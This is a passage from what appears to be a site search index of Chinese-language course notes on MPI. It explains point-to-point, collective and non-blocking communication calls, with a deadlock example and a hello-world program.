\u5f53\u9700\u8981\u8fdb\u884c\u8fdb\u7a0b\u4e4b\u95f4\u4e00\u5bf9\u591a\u3001\u591a\u5bf9\u4e00\u6216\u591a\u5bf9\u591a\u901a\u4fe1\u65f6\uff08\u5982\u5212\u5206\u4efb\u52a1\u3001\u6536\u96c6\u7ed3\u679c\uff09\uff0c\u4f7f\u7528\u591a\u4e2a Send/Recv \u4e0d\u65b9\u4fbf\uff0c\u53ef\u4ee5\u4f7f\u7528\u96c6\u5408\u901a\uff08Collective Communication\uff09 Barrier \u00b6 int MPI_Barrier ( MPI_Comm comm ) \u8fd0\u884c\u5230\u6b64\u51fd\u6570\u65f6\u8fdb\u884c\u7b49\u5f85\uff0c\u76f4\u5230 communicator \u4e2d\u6240\u6709\u8fdb\u7a0b\u90fd\u8fd0\u884c\u5230 Barrier \u4e4b\u540e\u518d\u4e00\u8d77\u7ee7\u7eed\u8fd0\u884c \u4e00\u5bf9\u591a \u00b6 MPI_Bcast \u00b6 int MPI_Bcast ( void * buffer , int count , MPI_Datatype datatype , int root , MPI_Comm comm ) \u6bd4 MPI_Send \u5c11\u4e86 dest\uff0c\u5373\u5c06 buffer \u4ece root \u53d1\u9001\u5230\u6240\u6709\u8fdb\u7a0b \u5305\u542b\u53d1\u9001\u548c\u63a5\u6536\uff08root \u53d1\u9001\uff0c\u5176\u5b83\u63a5\u6536\uff0croot \u53d1\u9001\u51fa buffer\uff0c\u5176\u5b83\u63a5\u6536\u653e\u5230 buffer \u4e2d\uff09 MPI_Bcast \u6548\u7387\u4e5f\u6bd4\u591a\u4e2a Send/Recv \u6548\u7387\u9ad8\uff08\u590d\u7528\u5df2\u7ecf\u5e7f\u64ad\u8fc7\u7684\u8282\u70b9\u8fdb\u884c\u65b0\u7684\u5e7f\u64ad\uff09 MPI_Scatter \u00b6 int MPI_Scatter ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , void * recvbuf , int recvcount , MPI_Datatype recvtype , int root , MPI_Comm comm ) \u4e0e Broadcast \u4e0d\u540c\u7684\u662f\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u63a5\u6536\u5230\u7684\u662f sendbuf \u7684\u4e00\u90e8\u5206 \u591a\u5bf9\u4e00 \u00b6 MPI_Gather \u00b6 int MPI_Gather ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , void * recvbuf , int recvcount , MPI_Datatype recvtype , int root , MPI_Comm comm ) \u53c2\u6570\u610f\u4e49\u4e5f\u90fd\u7c7b\u4f3c\uff0c\u5c06\u6240\u6709\u8fdb\u7a0b\u4e2d\u7684 sendbuf \u53d1\u9001\u7ed9 root \u8fdb\u7a0b\uff0c\u62fc\u63a5\u5230 recvbuf \u4e2d MPI_Reduce \u00b6 int MPI_Reduce ( const void * sendbuf , void * recvbuf , int count , MPI_Datatype datatype , MPI_Op op , int root , MPI_Comm comm ) \u7c7b\u4f3c MPI_Gather\uff0c\u4f46\u5c06\u6536\u96c6\u5230\u7684\u6570\u636e\u8fdb\u884c\u5904\u7406\u5408\u5e76\u5230 recvbuf \u4e2d MPI_Op \u53ef\u4ee5\u662f MPI_MAX MPI_MIN MPI_SUM MPI_PROD MPI_LAND\uff08\u903b\u8f91\u4e0e\uff09MPI_BAND\uff08\u4f4d\u4e0e\uff09MPI_LOR MPI_BOR MPI_LXOR MPI_BXOR MPI_MAXLOC\uff08\u6700\u5927\u503c\u4e0e\u4f4d\u7f6e\uff09MPI_MINLOC \u591a\u5bf9\u591a \u00b6 MPI_Allgather \u00b6 int MPI_Allgather ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , void * recvbuf , int recvcount , MPI_Datatype recvtype , MPI_Comm comm ) \u7c7b\u4f3c MPI_Gather\uff0c\u4f46\u6240\u6709\u8fdb\u7a0b\u90fd\u4f1a\u5f97\u5230 MPI_Gather \u4e2d root \u5f97\u5230\u7684\u5185\u5bb9 MPI_Alltoall \u00b6 int MPI_Alltoall ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , void * recvbuf , int recvcount , MPI_Datatype recvtype , MPI_Comm comm ) \u89c1\u56fe\uff1a \u5f02\u6b65\u4e0e\u53d8\u957f\u901a\u4fe1 \u00b6 \u524d\u9762\u7684\u901a\u4fe1\u8fc7\u7a0b\u90fd\u662f\u963b\u585e\u7684\uff0c\u4e5f\u5c31\u662f\u4e00\u76f4\u7b49\u5f85\u76f4\u5230\u901a\u4fe1\u7ed3\u675f \u975e\u963b\u585e\u901a\u4fe1\u5c31\u662f\u8c03\u7528\u901a\u4fe1\u51fd\u6570\u65f6\u5c06\u901a\u4fe1\u64cd\u4f5c\u540e\u53f0\u6267\u884c\uff0c\u901a\u4fe1\u51fd\u6570\u7acb\u5373\u8fd4\u56de\u6267\u884c\u4e0b\u4e00\u6b65\u3002\u53ef\u4ee5\u907f\u514d\u4e00\u4e9b\u6b7b\u9501\u7684\u53d1\u751f\uff0c\u5e76\u4e14\u53ef\u4ee5\u63d0\u9ad8\u6548\u7387 \u6b7b\u9501 \u00b6 MPI_Comm_rank ( comm , & rank ); MPI_Send ( sendbuf , count , MPI_INT , rank ^ 1 , tag , comm ); MPI_Recv ( recvbuf , count , MPI_INT , rank ^ 1 , tag , comm , & status ); \u4f8b\u5982\u5f53\u6709\u4e24\u4e2a\u7ebf\u7a0b\u7684\u65f6\u5019\uff0c\u60f3\u8981\u540c\u65f6\u53d1\u9001\u63a5\u6536\u6765\u4ea4\u6362\u6570\u636e\uff0c\u4f46\u8fd9\u6837\u4e24\u4e2a\u8fdb\u7a0b\u90fd\u5361\u5728\u4e86 Send \u9636\u6bb5\uff0c\u6ca1\u4eba\u63a5\u6536\u3001\u4e5f\u6ca1\u4eba Send \u6210\u529f\uff0c\u5bfc\u81f4\u6b7b\u9501 MPI_Sendrecv \u00b6 int MPI_Sendrecv ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , int dest , int sendtag , void * recvbuf , int recvcount , MPI_Datatyp recvtype , int source , int recvtag , MPI_Comm comm , MPI_Status * status ) \u5373\u540c\u65f6 Send \u548c Recv\uff0c\u53ef\u4ee5\u89e3\u51b3\u4e0a\u9762\u6b7b\u9501\u7684\u95ee\u9898 \u975e\u963b\u585e\u901a\u4fe1 \u00b6 MPI_Isend \u00b6 int MPI_Isend ( const void * buf , int count , MPI_Datatype datatype , int dest , int tag , MPI_Comm comm , MPI_Request * request ) \u975e\u963b\u585e\u5f0f Send\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a MPI_Request \u7528\u4e8e\u540e\u9762 Wait MPI_Irecv \u00b6 int MPI_Irecv ( void * buf , int count , MPI_Datatype datatype , int source , int tag , MPI_Comm comm , MPI_Request * request ) \u975e\u963b\u585e\u5f0f Recv\uff0c\u540c\u6837\u4f1a\u5f97\u5230\u4e00\u4e2a MPI_Request MPI_Test \u00b6 int MPI_Test ( MPI_Request * request , int * flag , MPI_Status * status ) \u68c0\u67e5\u67d0\u4e2a\u901a\u4fe1\u662f\u5426\u5b8c\u6210 request \u4f5c\u4e3a\u8f93\u5165 flag \u4f5c\u4e3a\u8f93\u51fa\uff0c\u5982\u679c\u901a\u4fe1\u5b8c\u6210\uff0c\u5219\u8bbe\u4e3a 1 status \u4f5c\u4e3a\u8f93\u51fa MPI_Testall \u00b6 int MPI_Testall ( int count , MPI_Request * request_list , int * flag , MPI_Status * status ) \u68c0\u67e5 request_list\uff08\u957f\u5ea6\u4e3a count\uff09\u4e2d\u7684\u901a\u4fe1\u662f\u5426\u5168\u90e8\u5b8c\u6210 \u53ea\u6709\u5168\u90e8\u5b8c\u6210\u65f6 flag \u624d\u4f1a\u8bbe\u4e3a 1 MPI_Wait \u00b6 int MPI_Wait ( MPI_Request * request , MPI_Status * status ) \u7528\u6765\u7b49\u5f85\u76f4\u5230 request \u5bf9\u5e94\u7684\u901a\u4fe1\u5b8c\u6210\uff0c\u540c\u7406\u4e5f\u6709 MPI_Waitall \u5904\u7406\u6b7b\u9501\uff1a MPI_Comm_rank ( comm , & rank ); MPI_ISend ( sendbuf , count , MPI_INT , rank ^ 1 , tag , comm \uff0c & req ); MPI_Recv ( recvbuf , count , MPI_INT , rank ^ 1 , tag , comm , & status ); MPI_Wait ( & req , & status ); \u53d8\u957f\u901a\u4fe1 \u00b6 int MPI_Alltoallv ( const void * sendbuf , const int sendcounts [], const int sdispls [], MPI_Datatype sendtype , void * recvbuf , const int recvcounts [], const int rdispls [], MPI_Datatype recvtype , MPI_Comm comm ) sendcounts \u4e3a\u6307\u5b9a\u5411\u4e0d\u540c rank \u53d1\u9001\u5143\u7d20\u4e2a\u6570\u7684\u6570\u7ec4 sdispls \u8981\u53d1\u9001\u7684\u6570\u636e\u76f8\u5bf9\u4e8e sendbuf \u7684\u504f\u79fb\u91cf\uff08\u6570\u7ec4\uff0c\u4e0b\u6807\u4e3a dest\uff09 recvcounts \u548c rdispls \u540c\u7406 \u5b9e\u73b0\u4e86\u591a\u5bf9\u591a\u901a\u4fe1\u65f6\u5404\u4e2a\u8fdb\u7a0b\u8981\u53d1\u9001/\u63a5\u6536\u7684\u5185\u5bb9\u5927\u5c0f\u4e0d\u540c\u7684\u53d8\u957f\u901a\u4fe1","title":"MPI \u57fa\u7840"},{"location":"hpc/hpc101/mpi/#mpi","text":"Abstract \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u56db\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u4ef6 MPI Tutorial","title":"MPI \u57fa\u7840"},{"location":"hpc/hpc101/mpi/#mpi_1","text":"MPI\uff08Message-Passing Interface\uff09\u662f\u4e00\u7ec4\u7528\u4e8e\u5e76\u884c\u5e94\u7528\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\u7684\u63a5\u53e3\u3002\u76ee\u524d\u6700\u65b0\u7684\u6807\u51c6\u4e3a MPI-4.0\uff082021.6.9\uff09 \u6709\u5f88\u591a\u5b9e\u73b0\uff0c\u6bd4\u5982 OpenMPI\u3001IntelMPI\uff08\u96c6\u6210\u5728 Intel oneAPI \u5957\u4ef6\u4e2d\uff09\u3001MPICH\u3001MVAPICH \u7b49 OpenMP \u5de5\u4f5c\u5728\u7edf\u4e00\u5185\u5b58\u4e0a\uff0c\u5373\u4efb\u610f\u4e00\u4e2a\u5904\u7406\u5668\u90fd\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u4efb\u610f\u4e00\u5757\u5185\u5b58 MPI \u5de5\u4f5c\u5728\u5206\u5e03\u5f0f\u5185\u5b58\u4e0a\uff0c\u5373\u4e00\u7ec4\u5904\u7406\u5668\u5171\u7528\u4e00\u5757\u5185\u5b58\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u5176\u4ed6\u5730\u65b9\u7684\u5185\u5b58\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8fdb\u884c\u6570\u636e\u7684\u4f20\u8f93 \u7c7b\u6bd4\u4e8e\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u4e4b\u95f4\u7684\u5173\u7cfb\uff1a\u8fdb\u7a0b\u62e5\u6709\u72ec\u7acb\u7684\u5185\u5b58\u5355\u5143\uff0c\u800c\u591a\u4e2a\u7ebf\u7a0b\u5171\u4eab\u5185\u5b58\uff1b\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u7ebf\u7a0b\uff1b\u7ebf\u7a0b\u9002\u7528\u4e8e\u591a\u6838\u60c5\u51b5\uff0c\u8fdb\u7a0b\u9002\u7528\u4e8e\u591a\u673a\u3001\u591a\u6838\u60c5\u51b5","title":"MPI \u7b80\u4ecb"},{"location":"hpc/hpc101/mpi/#hello-world","text":"#include <mpi.h> #include <stdio.h> int main ( int argc , char ** argv ) { MPI_Init ( NULL , NULL ); int world_size ; MPI_Comm_size ( MPI_COMM_WORLD , & world_size ); int world_rank ; MPI_Comm_rank ( MPI_COMM_WORLD , & world_rank ); char processor_name [ MPI_MAX_PROCESSOR_NAME ]; int name_len ; MPI_Get_processor_name ( processor_name , & name_len ); printf ( \"Hello world from processor %s, rank %d out of %d processors \\n \" , processor_name , world_rank , world_size ); MPI_Finalize (); } MPI_Init \uff1a\u521b\u5efa MPI \u73af\u5883\uff0c\u53c2\u6570\u4e00\u822c\u6ca1\u7528\uff0c\u5728\u8fd9\u671f\u95f4\u4f1a\u521b\u5efa\u4e00\u4e2a\u901a\u8baf\u5668\uff08communicator\uff09MPI_COMM_WORLD MPI_Comm_size \uff1a\u6839\u636e MPI_COMM_WORLD \u6765\u8bfb\u53d6\u603b\u8fdb\u7a0b\u6570\u91cf MPI_Comm_rank \uff1a\u6839\u636e MPI_COMM_WORLD \u6765\u8bfb\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684 rank\uff0c\u76f8\u5f53\u4e8e\u8fdb\u7a0b\u7f16\u53f7 MPI_Get_processor_name \uff1a\u83b7\u53d6\u5f53\u524d\u7a0b\u5e8f\u5b9e\u9645\u8fd0\u884c\u7684\u65f6\u5019\u8dd1\u5728\u7684\u5904\u7406\u5668\u540d\u5b57 MPI_Finalize \uff1a\u6e05\u7406 MPI \u73af\u5883 \u7f16\u8bd1\u8fd0\u884c\u5747\u4f7f\u7528 mpi \u63d0\u4f9b\u7684\u547d\u4ee4\uff1a mpicc code.c -o out mpirun -np 4 ./out \u5f00\u542f\u56db\u4e2a\u8fdb\u7a0b \u4e0d\u540c\u5b9e\u73b0\u7684 mpirun \u547d\u4ee4\u53c2\u6570\u4f1a\u6709\u4e0d\u540c \u5982\u679c\u4ee5 root \u8fd0\u884c\u9700\u8981\u5728 mpirun \u540e\u9762\u52a0 --allow-run-as-root","title":"hello world"},{"location":"hpc/hpc101/mpi/#_1","text":"mpirun \u4f1a\u542f\u52a8\u591a\u4e2a\u8fdb\u7a0b\uff0c\u4e14\u8fdb\u7a0b\u4e4b\u95f4\u5185\u5b58\u4e92\u76f8\u4e0d\u5171\u4eab\u3002\u9700\u8981\u5728\u8fdb\u7a0b\u4e4b\u95f4\u4f20\u9012\u6570\u636e\u5219\u9700\u8981\u8fdb\u884c\u901a\u4fe1\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u5c31\u662f\u70b9\u5bf9\u70b9\u901a\u4fe1\uff08Point-to-Point Communication\uff09 MPI \u7684\u901a\u4fe1\u8fc7\u7a0b\u5927\u81f4\u9700\u8981\u901a\u8fc7\u4e24\u4e2a\u6570\u7ec4\uff08\u5373 buffer\uff09\uff0c\u4e00\u4e2a\u5b58\u50a8\u53d1\u9001\u6570\u636e\uff0c\u4e00\u4e2a\u5b58\u50a8\u63a5\u6536\u6570\u636e\uff0c\u901a\u8fc7\u8c03\u7528\u4e00\u7cfb\u5217\u51fd\u6570\u5373\u53ef\u5b9e\u73b0\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1 \u8c03\u7528\u901a\u4fe1\u51fd\u6570\u540e\uff0c\u901a\u4fe1\u8bbe\u5907\uff08\u901a\u5e38\u662f\u7f51\u7edc\uff09\u5c31\u9700\u8981\u8d1f\u8d23\u628a\u4fe1\u606f\u4f20\u9012\u5230\u6b63\u786e\u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u662f\u67d0\u4e2a\u8fdb\u7a0b\u7684\u67d0\u4e2a\u63a5\u6536 buffer \u6709\u65f6\u5019 A \u9700\u8981\u4f20\u9012\u5f88\u591a\u4e0d\u540c\u7684\u6d88\u606f\u7ed9 B\u3002\u4e3a\u4e86\u8ba9 B \u80fd\u6bd4\u8f83\u65b9\u4fbf\u5730\u533a\u5206\u4e0d\u540c\u7684\u6d88\u606f\uff0cMPI \u8fd0\u884c\u53d1\u9001\u8005\u548c\u63a5\u53d7\u8005\u989d\u5916\u5730\u6307\u5b9a\u4e00\u4e9b\u4fe1\u606f ID\uff08\u6b63\u5f0f\u540d\u79f0\u662f\u6807\u7b7e\uff0ctags\uff09\u3002\u5f53 B \u53ea\u8981\u6c42\u63a5\u6536\u67d0\u79cd\u7279\u5b9a\u6807\u7b7e\u7684\u4fe1\u606f\u7684\u65f6\u5019\uff0c\u5176\u4ed6\u7684\u4e0d\u662f\u8fd9\u4e2a\u6807\u7b7e\u7684\u4fe1\u606f\u4f1a\u5148\u88ab\u7f13\u5b58\u8d77\u6765\uff0c\u7b49\u5230 B \u9700\u8981\u7684\u65f6\u5019\u624d\u4f1a\u7ed9B","title":"\u70b9\u5bf9\u70b9\u901a\u4fe1"},{"location":"hpc/hpc101/mpi/#_2","text":"","title":"\u57fa\u7840\u901a\u4fe1\u51fd\u6570"},{"location":"hpc/hpc101/mpi/#mpi_send","text":"int MPI_Send ( const void * buf , int count , MPI_Datatype datatype , int dest , int tag , MPI_Comm comm ) buf \u662f\u8981\u53d1\u9001\u7684 buffer \u7684\u9996\u5730\u5740 count \u662f buffer \u4e2d\u5143\u7d20\u7684\u4e2a\u6570 datatype \u8868\u793a\u53d1\u9001\u7684 buffer \u4e2d\u7684\u5143\u7d20\u7c7b\u578b \u5199\u6cd5\u4e00\u822c\u662f MPI_ <\u7c7b\u578b\u5927\u5199\uff0c\u4e0b\u5212\u7ebf\u5206\u9694> \uff0c\u4f8b\u5982 MPI_INT\u3001MPI_UNSIGNED_LONG_LONG dest \u662f\u53d1\u9001\u76ee\u6807\u7684 rank tag \u662f message tag comm \u662f communicator\uff0c\u4e00\u822c\u76f4\u63a5\u4f20 MPI_COMM_WORLD \u5373\u53ef","title":"MPI_Send"},{"location":"hpc/hpc101/mpi/#mpi_recv","text":"int MPI_Recv ( void * buf , int count , MPI_Datatype datatype , int source , int tag , MPI_Comm comm , MPI_Status * status ) buf \u662f\u8981\u5c06\u63a5\u6536\u5230\u7684\u5185\u5bb9\u5b58\u5165\u7684 buffer \u9996\u5730\u5740\uff08\u4f5c\u4e3a\u201c\u8f93\u51fa\u201d\uff09 count \u662f\u8981\u63a5\u6536\u7684 buffer \u5143\u7d20\u4e2a\u6570 datatype \u662f\u8981\u63a5\u6536\u7684 buffer \u4e2d\u5143\u7d20\u7c7b\u578b source \u662f\u63a5\u6536\u6765\u6e90\u7684 rank\uff08\u6216\u8005 MPI_ANY_SOURCE\uff09 tag \u662f message tag\uff08\u6216\u8005 MPI_ANY_TAG\uff09 comm \u662f communicator status \u662f\u63a5\u6536\u7684\u72b6\u6001\u7ed3\u6784\u4f53\uff08\u4f5c\u4e3a\u201c\u8f93\u51fa\u201d\uff09 \u4e0d\u9700\u8981\u65f6\u586b\u5199 MPI_STATUS_IGNORE MPI_Status \u4e2d\u5305\u542b\u4e09\u4e2a\u6210\u5458\u53d8\u91cf\uff1aMPI_SOURCE\u3001MPI_TAG\u3001MPI_ERROR \u53ef\u4ee5\u901a\u8fc7 MPI_Get_count(MPI_Status status, MPI_Datatype datatype, int count) \u51fd\u6570\u6765\u83b7\u53d6 count","title":"MPI_Recv"},{"location":"hpc/hpc101/mpi/#_3","text":"\u5f53\u9700\u8981\u8fdb\u884c\u8fdb\u7a0b\u4e4b\u95f4\u4e00\u5bf9\u591a\u3001\u591a\u5bf9\u4e00\u6216\u591a\u5bf9\u591a\u901a\u4fe1\u65f6\uff08\u5982\u5212\u5206\u4efb\u52a1\u3001\u6536\u96c6\u7ed3\u679c\uff09\uff0c\u4f7f\u7528\u591a\u4e2a Send/Recv \u4e0d\u65b9\u4fbf\uff0c\u53ef\u4ee5\u4f7f\u7528\u96c6\u5408\u901a\uff08Collective Communication\uff09","title":"\u96c6\u5408\u901a\u4fe1"},{"location":"hpc/hpc101/mpi/#barrier","text":"int MPI_Barrier ( MPI_Comm comm ) \u8fd0\u884c\u5230\u6b64\u51fd\u6570\u65f6\u8fdb\u884c\u7b49\u5f85\uff0c\u76f4\u5230 communicator \u4e2d\u6240\u6709\u8fdb\u7a0b\u90fd\u8fd0\u884c\u5230 Barrier \u4e4b\u540e\u518d\u4e00\u8d77\u7ee7\u7eed\u8fd0\u884c","title":"Barrier"},{"location":"hpc/hpc101/mpi/#_4","text":"","title":"\u4e00\u5bf9\u591a"},{"location":"hpc/hpc101/mpi/#mpi_bcast","text":"int MPI_Bcast ( void * buffer , int count , MPI_Datatype datatype , int root , MPI_Comm comm ) \u6bd4 MPI_Send \u5c11\u4e86 dest\uff0c\u5373\u5c06 buffer \u4ece root \u53d1\u9001\u5230\u6240\u6709\u8fdb\u7a0b \u5305\u542b\u53d1\u9001\u548c\u63a5\u6536\uff08root \u53d1\u9001\uff0c\u5176\u5b83\u63a5\u6536\uff0croot \u53d1\u9001\u51fa buffer\uff0c\u5176\u5b83\u63a5\u6536\u653e\u5230 buffer \u4e2d\uff09 MPI_Bcast \u6548\u7387\u4e5f\u6bd4\u591a\u4e2a Send/Recv \u6548\u7387\u9ad8\uff08\u590d\u7528\u5df2\u7ecf\u5e7f\u64ad\u8fc7\u7684\u8282\u70b9\u8fdb\u884c\u65b0\u7684\u5e7f\u64ad\uff09","title":"MPI_Bcast"},{"location":"hpc/hpc101/mpi/#mpi_scatter","text":"int MPI_Scatter ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , void * recvbuf , int recvcount , MPI_Datatype recvtype , int root , MPI_Comm comm ) \u4e0e Broadcast \u4e0d\u540c\u7684\u662f\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u63a5\u6536\u5230\u7684\u662f sendbuf \u7684\u4e00\u90e8\u5206","title":"MPI_Scatter"},{"location":"hpc/hpc101/mpi/#_5","text":"","title":"\u591a\u5bf9\u4e00"},{"location":"hpc/hpc101/mpi/#mpi_gather","text":"int MPI_Gather ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , void * recvbuf , int recvcount , MPI_Datatype recvtype , int root , MPI_Comm comm ) \u53c2\u6570\u610f\u4e49\u4e5f\u90fd\u7c7b\u4f3c\uff0c\u5c06\u6240\u6709\u8fdb\u7a0b\u4e2d\u7684 sendbuf \u53d1\u9001\u7ed9 root \u8fdb\u7a0b\uff0c\u62fc\u63a5\u5230 recvbuf \u4e2d","title":"MPI_Gather"},{"location":"hpc/hpc101/mpi/#mpi_reduce","text":"int MPI_Reduce ( const void * sendbuf , void * recvbuf , int count , MPI_Datatype datatype , MPI_Op op , int root , MPI_Comm comm ) \u7c7b\u4f3c MPI_Gather\uff0c\u4f46\u5c06\u6536\u96c6\u5230\u7684\u6570\u636e\u8fdb\u884c\u5904\u7406\u5408\u5e76\u5230 recvbuf \u4e2d MPI_Op \u53ef\u4ee5\u662f MPI_MAX MPI_MIN MPI_SUM MPI_PROD MPI_LAND\uff08\u903b\u8f91\u4e0e\uff09MPI_BAND\uff08\u4f4d\u4e0e\uff09MPI_LOR MPI_BOR MPI_LXOR MPI_BXOR MPI_MAXLOC\uff08\u6700\u5927\u503c\u4e0e\u4f4d\u7f6e\uff09MPI_MINLOC","title":"MPI_Reduce"},{"location":"hpc/hpc101/mpi/#_6","text":"","title":"\u591a\u5bf9\u591a"},{"location":"hpc/hpc101/mpi/#mpi_allgather","text":"int MPI_Allgather ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , void * recvbuf , int recvcount , MPI_Datatype recvtype , MPI_Comm comm ) \u7c7b\u4f3c MPI_Gather\uff0c\u4f46\u6240\u6709\u8fdb\u7a0b\u90fd\u4f1a\u5f97\u5230 MPI_Gather \u4e2d root \u5f97\u5230\u7684\u5185\u5bb9","title":"MPI_Allgather"},{"location":"hpc/hpc101/mpi/#mpi_alltoall","text":"int MPI_Alltoall ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , void * recvbuf , int recvcount , MPI_Datatype recvtype , MPI_Comm comm ) \u89c1\u56fe\uff1a","title":"MPI_Alltoall"},{"location":"hpc/hpc101/mpi/#_7","text":"\u524d\u9762\u7684\u901a\u4fe1\u8fc7\u7a0b\u90fd\u662f\u963b\u585e\u7684\uff0c\u4e5f\u5c31\u662f\u4e00\u76f4\u7b49\u5f85\u76f4\u5230\u901a\u4fe1\u7ed3\u675f \u975e\u963b\u585e\u901a\u4fe1\u5c31\u662f\u8c03\u7528\u901a\u4fe1\u51fd\u6570\u65f6\u5c06\u901a\u4fe1\u64cd\u4f5c\u540e\u53f0\u6267\u884c\uff0c\u901a\u4fe1\u51fd\u6570\u7acb\u5373\u8fd4\u56de\u6267\u884c\u4e0b\u4e00\u6b65\u3002\u53ef\u4ee5\u907f\u514d\u4e00\u4e9b\u6b7b\u9501\u7684\u53d1\u751f\uff0c\u5e76\u4e14\u53ef\u4ee5\u63d0\u9ad8\u6548\u7387","title":"\u5f02\u6b65\u4e0e\u53d8\u957f\u901a\u4fe1"},{"location":"hpc/hpc101/mpi/#_8","text":"MPI_Comm_rank ( comm , & rank ); MPI_Send ( sendbuf , count , MPI_INT , rank ^ 1 , tag , comm ); MPI_Recv ( recvbuf , count , MPI_INT , rank ^ 1 , tag , comm , & status ); \u4f8b\u5982\u5f53\u6709\u4e24\u4e2a\u7ebf\u7a0b\u7684\u65f6\u5019\uff0c\u60f3\u8981\u540c\u65f6\u53d1\u9001\u63a5\u6536\u6765\u4ea4\u6362\u6570\u636e\uff0c\u4f46\u8fd9\u6837\u4e24\u4e2a\u8fdb\u7a0b\u90fd\u5361\u5728\u4e86 Send \u9636\u6bb5\uff0c\u6ca1\u4eba\u63a5\u6536\u3001\u4e5f\u6ca1\u4eba Send \u6210\u529f\uff0c\u5bfc\u81f4\u6b7b\u9501","title":"\u6b7b\u9501"},{"location":"hpc/hpc101/mpi/#mpi_sendrecv","text":"int MPI_Sendrecv ( const void * sendbuf , int sendcount , MPI_Datatype sendtype , int dest , int sendtag , void * recvbuf , int recvcount , MPI_Datatyp recvtype , int source , int recvtag , MPI_Comm comm , MPI_Status * status ) \u5373\u540c\u65f6 Send \u548c Recv\uff0c\u53ef\u4ee5\u89e3\u51b3\u4e0a\u9762\u6b7b\u9501\u7684\u95ee\u9898","title":"MPI_Sendrecv"},{"location":"hpc/hpc101/mpi/#_9","text":"","title":"\u975e\u963b\u585e\u901a\u4fe1"},{"location":"hpc/hpc101/mpi/#mpi_isend","text":"int MPI_Isend ( const void * buf , int count , MPI_Datatype datatype , int dest , int tag , MPI_Comm comm , MPI_Request * request ) \u975e\u963b\u585e\u5f0f Send\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a MPI_Request \u7528\u4e8e\u540e\u9762 Wait","title":"MPI_Isend"},{"location":"hpc/hpc101/mpi/#mpi_irecv","text":"int MPI_Irecv ( void * buf , int count , MPI_Datatype datatype , int source , int tag , MPI_Comm comm , MPI_Request * request ) \u975e\u963b\u585e\u5f0f Recv\uff0c\u540c\u6837\u4f1a\u5f97\u5230\u4e00\u4e2a MPI_Request","title":"MPI_Irecv"},{"location":"hpc/hpc101/mpi/#mpi_test","text":"int MPI_Test ( MPI_Request * request , int * flag , MPI_Status * status ) \u68c0\u67e5\u67d0\u4e2a\u901a\u4fe1\u662f\u5426\u5b8c\u6210 request \u4f5c\u4e3a\u8f93\u5165 flag \u4f5c\u4e3a\u8f93\u51fa\uff0c\u5982\u679c\u901a\u4fe1\u5b8c\u6210\uff0c\u5219\u8bbe\u4e3a 1 status \u4f5c\u4e3a\u8f93\u51fa","title":"MPI_Test"},{"location":"hpc/hpc101/mpi/#mpi_testall","text":"int MPI_Testall ( int count , MPI_Request * request_list , int * flag , MPI_Status * status ) \u68c0\u67e5 request_list\uff08\u957f\u5ea6\u4e3a count\uff09\u4e2d\u7684\u901a\u4fe1\u662f\u5426\u5168\u90e8\u5b8c\u6210 \u53ea\u6709\u5168\u90e8\u5b8c\u6210\u65f6 flag \u624d\u4f1a\u8bbe\u4e3a 1","title":"MPI_Testall"},{"location":"hpc/hpc101/mpi/#mpi_wait","text":"int MPI_Wait ( MPI_Request * request , MPI_Status * status ) \u7528\u6765\u7b49\u5f85\u76f4\u5230 request \u5bf9\u5e94\u7684\u901a\u4fe1\u5b8c\u6210\uff0c\u540c\u7406\u4e5f\u6709 MPI_Waitall \u5904\u7406\u6b7b\u9501\uff1a MPI_Comm_rank ( comm , & rank ); MPI_ISend ( sendbuf , count , MPI_INT , rank ^ 1 , tag , comm \uff0c & req ); MPI_Recv ( recvbuf , count , MPI_INT , rank ^ 1 , tag , comm , & status ); MPI_Wait ( & req , & status );","title":"MPI_Wait"},{"location":"hpc/hpc101/mpi/#_10","text":"int MPI_Alltoallv ( const void * sendbuf , const int sendcounts [], const int sdispls [], MPI_Datatype sendtype , void * recvbuf , const int recvcounts [], const int rdispls [], MPI_Datatype recvtype , MPI_Comm comm ) sendcounts \u4e3a\u6307\u5b9a\u5411\u4e0d\u540c rank \u53d1\u9001\u5143\u7d20\u4e2a\u6570\u7684\u6570\u7ec4 sdispls \u8981\u53d1\u9001\u7684\u6570\u636e\u76f8\u5bf9\u4e8e sendbuf \u7684\u504f\u79fb\u91cf\uff08\u6570\u7ec4\uff0c\u4e0b\u6807\u4e3a dest\uff09 recvcounts \u548c rdispls \u540c\u7406 \u5b9e\u73b0\u4e86\u591a\u5bf9\u591a\u901a\u4fe1\u65f6\u5404\u4e2a\u8fdb\u7a0b\u8981\u53d1\u9001/\u63a5\u6536\u7684\u5185\u5bb9\u5927\u5c0f\u4e0d\u540c\u7684\u53d8\u957f\u901a\u4fe1","title":"\u53d8\u957f\u901a\u4fe1"},{"location":"hpc/hpc101/openmp/","text":"OpenMP \u57fa\u7840 \u00b6 Abstract 